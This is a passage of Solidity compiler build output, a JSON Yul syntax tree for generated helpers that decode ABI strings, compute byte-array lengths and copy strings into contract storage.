																	"name": "abi_decode_string_fromMemory",
																	"nodeType": "YulIdentifier",
																	"src": "1309:28:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1309:61:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "1299:6:5"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1379:41:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1405:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1416:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1401:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1401:18:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "1395:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1395:25:5"
															},
															"variables": [
																{
																	"name": "offset_1",
																	"nodeType": "YulTypedName",
																	"src": "1383:8:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1449:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1458:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1461:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1451:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1451:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1451:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "offset_1",
																		"nodeType": "YulIdentifier",
																		"src": "1435:8:5"
																	},
																	{
																		"name": "_1",
																		"nodeType": "YulIdentifier",
																		"src": "1445:2:5"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "1432:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1432:16:5"
															},
															"nodeType": "YulIf",
															"src": "1429:36:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1474:73:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1517:9:5"
																			},
																			{
																				"name": "offset_1",
																				"nodeType": "YulIdentifier",
																				"src": "1528:8:5"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1513:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1513:24:5"
																	},
																	{
																		"name": "dataEnd",
																		"nodeType": "YulIdentifier",
																		"src": "1539:7:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_string_fromMemory",
																	"nodeType": "YulIdentifier",
																	"src": "1484:28:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1484:63:5"
															},
															"variableNames": [
																{
																	"name": "value1",
																	"nodeType": "YulIdentifier",
																	"src": "1474:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_string_memory_ptrt_string_memory_ptr_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1067:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "1078:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1090:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1098:6:5",
														"type": ""
													}
												],
												"src": "991:562:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1613:325:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1623:22:5",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1637:1:5",
																		"type": "",
																		"value": "1"
																	},
																	{
																		"name": "data",
																		"nodeType": "YulIdentifier",
																		"src": "1640:4:5"
																	}
																],
																"functionName": {
																	"name": "shr",
																	"nodeType": "YulIdentifier",
																	"src": "1633:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1633:12:5"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "1623:6:5"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1654:38:5",
															"value": {
																"arguments": [
																	{
																		"name": "data",
																		"nodeType": "YulIdentifier",
																		"src": "1684:4:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1690:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1680:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1680:12:5"
															},
															"variables": [
																{
																	"name": "outOfPlaceEncoding",
																	"nodeType": "YulTypedName",
																	"src": "1658:18:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1731:31:5",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1733:27:5",
																		"value": {
																			"arguments": [
																				{
																					"name": "length",
																					"nodeType": "YulIdentifier",
																					"src": "1747:6:5"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1755:4:5",
																					"type": "",
																					"value": "0x7f"
																				}
																			],
																			"functionName": {
																				"name": "and",
																				"nodeType": "YulIdentifier",
																				"src": "1743:3:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1743:17:5"
																		},
																		"variableNames": [
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "1733:6:5"
																			}
																		]
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "outOfPlaceEncoding",
																		"nodeType": "YulIdentifier",
																		"src": "1711:18:5"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1704:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1704:26:5"
															},
															"nodeType": "YulIf",
															"src": "1701:61:5"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1821:111:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1842:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"arguments": [
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "1849:3:5",
																							"type": "",
																							"value": "224"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "1854:10:5",
																							"type": "",
																							"value": "0x4e487b71"
																						}
																					],
																					"functionName": {
																						"name": "shl",
																						"nodeType": "YulIdentifier",
																						"src": "1845:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "1845:20:5"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "1835:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1835:31:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1835:31:5"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1886:1:5",
																					"type": "",
																					"value": "4"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1889:4:5",
																					"type": "",
																					"value": "0x22"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "1879:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1879:15:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1879:15:5"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1914:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1917:4:5",
																					"type": "",
																					"value": "0x24"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1907:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1907:15:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1907:15:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "outOfPlaceEncoding",
																		"nodeType": "YulIdentifier",
																		"src": "1777:18:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "1800:6:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1808:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "lt",
																			"nodeType": "YulIdentifier",
																			"src": "1797:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1797:14:5"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "1774:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1774:38:5"
															},
															"nodeType": "YulIf",
															"src": "1771:161:5"
														}
													]
												},
												"name": "extract_byte_array_length",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "data",
														"nodeType": "YulTypedName",
														"src": "1593:4:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1602:6:5",
														"type": ""
													}
												],
												"src": "1558:380:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1999:65:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2016:1:5",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"name": "ptr",
																		"nodeType": "YulIdentifier",
																		"src": "2019:3:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2009:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2009:14:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2009:14:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2032:26:5",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2050:1:5",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2053:4:5",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "keccak256",
																	"nodeType": "YulIdentifier",
																	"src": "2040:9:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2040:18:5"
															},
															"variableNames": [
																{
																	"name": "data",
																	"nodeType": "YulIdentifier",
																	"src": "2032:4:5"
																}
															]
														}
													]
												},
												"name": "array_dataslot_string_storage",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "ptr",
														"nodeType": "YulTypedName",
														"src": "1982:3:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "data",
														"nodeType": "YulTypedName",
														"src": "1990:4:5",
														"type": ""
													}
												],
												"src": "1943:121:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2150:464:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2183:425:5",
																"statements": [
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "2197:11:5",
																		"value": {
																			"kind": "number",
																			"nodeType": "YulLiteral",
																			"src": "2207:1:5",
																			"type": "",
																			"value": "0"
																		},
																		"variables": [
																			{
																				"name": "_1",
																				"nodeType": "YulTypedName",
																				"src": "2201:2:5",
																				"type": ""
																			}
																		]
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"name": "_1",
																					"nodeType": "YulIdentifier",
																					"src": "2228:2:5"
																				},
																				{
																					"name": "array",
																					"nodeType": "YulIdentifier",
																					"src": "2232:5:5"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "2221:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2221:17:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2221:17:5"
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "2251:31:5",
																		"value": {
																			"arguments": [
																				{
																					"name": "_1",
																					"nodeType": "YulIdentifier",
																					"src": "2273:2:5"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2277:4:5",
																					"type": "",
																					"value": "0x20"
																				}
																			],
																			"functionName": {
																				"name": "keccak256",
																				"nodeType": "YulIdentifier",
																				"src": "2263:9:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2263:19:5"
																		},
																		"variables": [
																			{
																				"name": "data",
																				"nodeType": "YulTypedName",
																				"src": "2255:4:5",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "2295:57:5",
																		"value": {
																			"arguments": [
																				{
																					"name": "data",
																					"nodeType": "YulIdentifier",
																					"src": "2318:4:5"
																				},
																				{
																					"arguments": [
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "2328:1:5",
																							"type": "",
																							"value": "5"
																						},
																						{
																							"arguments": [
																								{
																									"name": "startIndex",
																									"nodeType": "YulIdentifier",
																									"src": "2335:10:5"
																								},
																								{
																									"kind": "number",
																									"nodeType": "YulLiteral",
																									"src": "2347:2:5",
																									"type": "",
																									"value": "31"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "2331:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "2331:19:5"
																						}
																					],
																					"functionName": {
																						"name": "shr",
																						"nodeType": "YulIdentifier",
																						"src": "2324:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "2324:27:5"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "2314:3:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2314:38:5"
																		},
																		"variables": [
																			{
																				"name": "deleteStart",
																				"nodeType": "YulTypedName",
																				"src": "2299:11:5",
																				"type": ""
																			}
																		]
																	},
																	{
																		"body": {
																			"nodeType": "YulBlock",
																			"src": "2389:23:5",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "2391:19:5",
																					"value": {
																						"name": "data",
																						"nodeType": "YulIdentifier",
																						"src": "2406:4:5"
																					},
																					"variableNames": [
																						{
																							"name": "deleteStart",
																							"nodeType": "YulIdentifier",
																							"src": "2391:11:5"
																						}
																					]
																				}
																			]
																		},
																		"condition": {
																			"arguments": [
																				{
																					"name": "startIndex",
																					"nodeType": "YulIdentifier",
																					"src": "2371:10:5"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2383:4:5",
																					"type": "",
																					"value": "0x20"
																				}
																			],
																			"functionName": {
																				"name": "lt",
																				"nodeType": "YulIdentifier",
																				"src": "2368:2:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2368:20:5"
																		},
																		"nodeType": "YulIf",
																		"src": "2365:47:5"
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "2425:41:5",
																		"value": {
																			"arguments": [
																				{
																					"name": "data",
																					"nodeType": "YulIdentifier",
																					"src": "2439:4:5"
																				},
																				{
																					"arguments": [
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "2449:1:5",
																							"type": "",
																							"value": "5"
																						},
																						{
																							"arguments": [
																								{
																									"name": "len",
																									"nodeType": "YulIdentifier",
																									"src": "2456:3:5"
																								},
																								{
																									"kind": "number",
																									"nodeType": "YulLiteral",
																									"src": "2461:2:5",
																									"type": "",
																									"value": "31"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "2452:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "2452:12:5"
																						}
																					],
																					"functionName": {
																						"name": "shr",
																						"nodeType": "YulIdentifier",
																						"src": "2445:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "2445:20:5"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "2435:3:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2435:31:5"
																		},
																		"variables": [
																			{
																				"name": "_2",
																				"nodeType": "YulTypedName",
																				"src": "2429:2:5",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "2479:24:5",
																		"value": {
																			"name": "deleteStart",
																			"nodeType": "YulIdentifier",
																			"src": "2492:11:5"
																		},
																		"variables": [
																			{
																				"name": "start",
																				"nodeType": "YulTypedName",
																				"src": "2483:5:5",
																				"type": ""
																			}
																		]
																	},
																	{
																		"body": {
																			"nodeType": "YulBlock",
																			"src": "2577:21:5",
																			"statements": [
																				{
																					"expression": {
																						"arguments": [
																							{
																								"name": "start",
																								"nodeType": "YulIdentifier",
																								"src": "2586:5:5"
																							},
																							{
																								"name": "_1",
																								"nodeType": "YulIdentifier",
																								"src": "2593:2:5"
																							}
																						],
																						"functionName": {
																							"name": "sstore",
																							"nodeType": "YulIdentifier",
																							"src": "2579:6:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2579:17:5"
																					},
																					"nodeType": "YulExpressionStatement",
																					"src": "2579:17:5"
																				}
																			]
																		},
																		"condition": {
																			"arguments": [
																				{
																					"name": "start",
																					"nodeType": "YulIdentifier",
																					"src": "2527:5:5"
																				},
																				{
																					"name": "_2",
																					"nodeType": "YulIdentifier",
																					"src": "2534:2:5"
																				}
																			],
																			"functionName": {
																				"name": "lt",
																				"nodeType": "YulIdentifier",
																				"src": "2524:2:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2524:13:5"
																		},
																		"nodeType": "YulForLoop",
																		"post": {
																			"nodeType": "YulBlock",
																			"src": "2538:26:5",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "2540:22:5",
																					"value": {
																						"arguments": [
																							{
																								"name": "start",
																								"nodeType": "YulIdentifier",
																								"src": "2553:5:5"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "2560:1:5",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "add",
																							"nodeType": "YulIdentifier",
																							"src": "2549:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2549:13:5"
																					},
																					"variableNames": [
																						{
																							"name": "start",
																							"nodeType": "YulIdentifier",
																							"src": "2540:5:5"
																						}
																					]
																				}
																			]
																		},
																		"pre": {
																			"nodeType": "YulBlock",
																			"src": "2520:3:5",
																			"statements": []
																		},
																		"src": "2516:82:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "len",
																		"nodeType": "YulIdentifier",
																		"src": "2166:3:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2171:2:5",
																		"type": "",
																		"value": "31"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "2163:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2163:11:5"
															},
															"nodeType": "YulIf",
															"src": "2160:448:5"
														}
													]
												},
												"name": "clean_up_bytearray_end_slots_string_storage",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "array",
														"nodeType": "YulTypedName",
														"src": "2122:5:5",
														"type": ""
													},
													{
														"name": "len",
														"nodeType": "YulTypedName",
														"src": "2129:3:5",
														"type": ""
													},
													{
														"name": "startIndex",
														"nodeType": "YulTypedName",
														"src": "2134:10:5",
														"type": ""
													}
												],
												"src": "2069:545:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2704:81:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2714:65:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "data",
																				"nodeType": "YulIdentifier",
																				"src": "2729:4:5"
																			},
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "2747:1:5",
																										"type": "",
																										"value": "3"
																									},
																									{
																										"name": "len",
																										"nodeType": "YulIdentifier",
																										"src": "2750:3:5"
																									}
																								],
																								"functionName": {
																									"name": "shl",
																									"nodeType": "YulIdentifier",
																									"src": "2743:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "2743:11:5"
																							},
																							{
																								"arguments": [
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "2760:1:5",
																										"type": "",
																										"value": "0"
																									}
																								],
																								"functionName": {
																									"name": "not",
																									"nodeType": "YulIdentifier",
																									"src": "2756:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "2756:6:5"
																							}
																						],
																						"functionName": {
																							"name": "shr",
																							"nodeType": "YulIdentifier",
																							"src": "2739:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2739:24:5"
																					}
																				],
																				"functionName": {
																					"name": "not",
																					"nodeType": "YulIdentifier",
																					"src": "2735:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2735:29:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "2725:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2725:40:5"
																	},
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2771:1:5",
																				"type": "",
																				"value": "1"
																			},
																			{
																				"name": "len",
																				"nodeType": "YulIdentifier",
																				"src": "2774:3:5"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "2767:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2767:11:5"
																	}
																],
																"functionName": {
																	"name": "or",
																	"nodeType": "YulIdentifier",
																	"src": "2722:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2722:57:5"
															},
															"variableNames": [
																{
																	"name": "used",
																	"nodeType": "YulIdentifier",
																	"src": "2714:4:5"
																}
															]
														}
													]
												},
												"name": "extract_used_part_and_set_length_of_short_byte_array",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "data",
														"nodeType": "YulTypedName",
														"src": "2681:4:5",
														"type": ""
													},
													{
														"name": "len",
														"nodeType": "YulTypedName",
														"src": "2687:3:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "used",
														"nodeType": "YulTypedName",
														"src": "2695:4:5",
														"type": ""
													}
												],
												"src": "2619:166:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2886:1256:5",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "2896:24:5",
															"value": {
																"arguments": [
																	{
																		"name": "src",
																		"nodeType": "YulIdentifier",
																		"src": "2916:3:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "2910:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2910:10:5"
															},
															"variables": [
																{
																	"name": "newLen",
																	"nodeType": "YulTypedName",
																	"src": "2900:6:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2963:22:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x41",
																				"nodeType": "YulIdentifier",
																				"src": "2965:16:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2965:18:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2965:18:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "newLen",
																		"nodeType": "YulIdentifier",
																		"src": "2935:6:5"
																	},
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "2951:2:5",
																						"type": "",
																						"value": "64"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "2955:1:5",
																						"type": "",
																						"value": "1"
																					}
																				],
																				"functionName": {
																					"name": "shl",
																					"nodeType": "YulIdentifier",
																					"src": "2947:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2947:10:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2959:1:5",
																				"type": "",
																				"value": "1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "2943:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2943:18:5"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "2932:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2932:30:5"
															},
															"nodeType": "YulIf",
															"src": "2929:56:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "slot",
																		"nodeType": "YulIdentifier",
																		"src": "3038:4:5"
																	},
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "slot",
																						"nodeType": "YulIdentifier",
																						"src": "3076:4:5"
																					}
																				],
																				"functionName": {
																					"name": "sload",
																					"nodeType": "YulIdentifier",
																					"src": "3070:5:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "3070:11:5"
																			}
																		],
																		"functionName": {
																			"name": "extract_byte_array_length",
																			"nodeType": "YulIdentifier",
																			"src": "3044:25:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3044:38:5"
																	},
																	{
																		"name": "newLen",
																		"nodeType": "YulIdentifier",
																		"src": "3084:6:5"
																	}
																],
																"functionName": {
																	"name": "clean_up_bytearray_end_slots_string_storage",
																	"nodeType": "YulIdentifier",
																	"src": "2994:43:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2994:97:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2994:97:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "3100:18:5",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "3117:1:5",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "srcOffset",
																	"nodeType": "YulTypedName",
																	"src": "3104:9:5",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "3127:23:5",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "3146:4:5",
																"type": "",
																"value": "0x20"
															},
															"variables": [
																{
																	"name": "srcOffset_1",
																	"nodeType": "YulTypedName",
																	"src": "3131:11:5",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "3159:24:5",
															"value": {
																"name": "srcOffset_1",
																"nodeType": "YulIdentifier",
																"src": "3172:11:5"
															},
															"variableNames": [
																{
																	"name": "srcOffset",
																	"nodeType": "YulIdentifier",
																	"src": "3159:9:5"
																}
															]
														},
														{
															"cases": [
																{
																	"body": {
																		"nodeType": "YulBlock",
																		"src": "3229:656:5",
																		"statements": [
																			{
																				"nodeType": "YulVariableDeclaration",
																				"src": "3243:35:5",
																				"value": {
																					"arguments": [
																						{
																							"name": "newLen",
																							"nodeType": "YulIdentifier",
																							"src": "3262:6:5"
																						},
																						{
																							"arguments": [
																								{
																									"kind": "number",
																									"nodeType": "YulLiteral",
																									"src": "3274:2:5",
																									"type": "",
																									"value": "31"
																								}
																							],
																							"functionName": {
																								"name": "not",
																								"nodeType": "YulIdentifier",
																								"src": "3270:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "3270:7:5"
																						}
																					],
																					"functionName": {
																						"name": "and",
																						"nodeType": "YulIdentifier",
																						"src": "3258:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3258:20:5"
																				},
																				"variables": [
																					{
																						"name": "loopEnd",
																						"nodeType": "YulTypedName",
																						"src": "3247:7:5",
																						"type": ""
																					}
																				]
																			},
																			{
																				"nodeType": "YulVariableDeclaration",
																				"src": "3291:49:5",
																				"value": {
																					"arguments": [
																						{
																							"name": "slot",
																							"nodeType": "YulIdentifier",
																							"src": "3335:4:5"
																						}
																					],
																					"functionName": {
																						"name": "array_dataslot_string_storage",
																						"nodeType": "YulIdentifier",
																						"src": "3305:29:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3305:35:5"
																				},
																				"variables": [
																					{
																						"name": "dstPtr",
																						"nodeType": "YulTypedName",
																						"src": "3295:6:5",
																						"type": ""
																					}
																				]
																			},
																			{
																				"nodeType": "YulVariableDeclaration",
																				"src": "3353:10:5",
																				"value": {
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3362:1:5",
																					"type": "",
																					"value": "0"
																				},
																				"variables": [
																					{
																						"name": "i",
																						"nodeType": "YulTypedName",
																						"src": "3357:1:5",
																						"type": ""
																					}
																				]
																			},
																			{
																				"body": {
																					"nodeType": "YulBlock",
																					"src": "3440:172:5",
																					"statements": [
																						{
																							"expression": {
																								"arguments": [
																									{
																										"name": "dstPtr",
																										"nodeType": "YulIdentifier",
																										"src": "3465:6:5"
																									},
																									{
																										"arguments": [
																											{
																												"arguments": [
																													{
																														"name": "src",
																														"nodeType": "YulIdentifier",
																														"src": "3483:3:5"
																													},
																													{
																														"name": "srcOffset",
																														"nodeType": "YulIdentifier",
																														"src": "3488:9:5"
																													}
																												],
																												"functionName": {
																													"name": "add",
																													"nodeType": "YulIdentifier",
																													"src": "3479:3:5"
																												},
